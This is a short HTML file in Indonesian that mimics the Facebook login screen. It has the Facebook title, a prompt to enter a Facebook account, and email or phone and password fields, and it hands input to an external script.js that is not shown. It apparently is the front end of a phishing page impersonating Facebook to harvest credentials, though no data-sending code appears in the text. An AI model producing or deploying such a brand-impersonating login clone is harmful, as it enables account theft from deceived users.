<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Masuk</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <h2>Facebook</h2>
        <p>Masukkan akun Facebook Anda</p>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Email atau Nomor HP" required><br>
            <input type="password" id="password" placeholder="Kata Sandi" required><br>
            <button type="submit">Masuk</button>
        </form>
        <p id="warning"></p>
    </div>

    <script src="script.js"></script>
</body>
</html>
